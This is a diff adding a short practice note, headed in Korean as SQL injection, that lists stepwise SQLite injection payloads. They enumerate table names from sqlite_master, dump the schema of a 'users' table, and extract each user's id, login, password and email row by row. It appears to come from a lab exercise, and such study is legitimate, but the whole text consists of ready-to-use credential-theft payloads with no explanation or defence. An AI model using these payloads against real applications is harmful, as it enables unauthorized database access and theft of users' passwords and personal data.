@@ -1,0 +1,33 @@
+ 3) SQL 인젝션
+
+ ④ 
+
+abcd', (select tbl_name from sqlite_master limit 0,1)) --
+abcd', (select tbl_name from sqlite_master limit 1,1)) --
+abcd', (select tbl_name from sqlite_master limit 2,1)) --
+abcd', (select tbl_name from sqlite_master limit 3,1)) --
+abcd', (select tbl_name from sqlite_master limit 4,1)) --
+abcd', (select tbl_name from sqlite_master limit 5,1)) --
+abcd', (select tbl_name from sqlite_master limit 6,1)) --
+abcd', (select tbl_name from sqlite_master limit 7,1)) --
+
+
+ ⑤ 
+
+abcd', (select sql from sqlite_master where tbl_name='users')) --
+
+
+ ⑥ 
+
+abcd', (select id from users limit 0,1)) --
+abcd', (select login from users limit 0,1)) --
+abcd', (select password from users limit 0,1)) --
+abcd', (select email from users limit 0,1)) --
+abcd', (select id||login||password||email from users limit 0,1)) --
+
+abcd', (select id from users limit 1,1)) --
+abcd', (select login from users limit 1,1)) --
+abcd', (select password from users limit 1,1)) --
+abcd', (select email from users limit 1,1)) --
+abcd', (select id||login||password||email from users limit 1,1)) --
+
